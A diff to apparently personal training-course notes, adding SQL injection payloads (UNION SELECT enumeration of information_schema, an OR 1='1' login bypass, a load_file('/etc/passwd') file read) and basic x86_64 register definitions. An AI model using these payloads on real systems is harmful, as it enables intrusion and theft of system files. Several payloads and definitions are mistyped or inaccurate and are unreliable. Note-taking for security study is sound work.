@@ -57,6 +57,7 @@ Day 2
 Day 3
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
   - SQL:
+    - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
     - mysql opens sql 
     - select * from session.car; - shows everything from that session
     - select * from union select [table], [columns], 1, 2
@@ -97,4 +98,26 @@ Day 3
         - Server Query Appears as:
           - SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
         - Doing this in the URL using a get method can show username info
-        -
+        - Selection=2 Union Select 1,2,3 = shows a layout of what tables go in what order using GET method
+        - [Table]=2 Union Select 1,2,3,load_file("/etc/passwd)",5 # = loads a file using POST method 
+        - php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()        
+        - Selection=2 Union Select table_schema, table_name FROM information_schema.table = loads information schema table, showing all info about the database
+        - [Table] UNION SELECT @@version.database(),3,name,size FROM session.[session name]; 5 - POST
+     - Information Schema:
+       - On SQL server: 
+         To showSELECT * FROM sys.databases;
+         EXEC sp_databases; 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+Day 4
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+  - Reverse Engineering
+    - X86_64 Assembly:
+      - %rax - return the first register
+      - %rbp - the base pointer that keeps track of the base of the stack
+      - %rsp - the stack pointer that points to the top of the stack
+      - HEAP - Memory that can be allocated and deallocated
+      - STACK - A contiguous section of memory used for passing arguments
+      - GENERAL REGISTER - A multipurpose register that can be used by either programmer or user to store data or a memory location address
+      - CONTROL REGISTER - A processor register that changes or controls the behavior of a CPU
+      - FLAGS REGISTER - Contains the current state of the processor
+      -
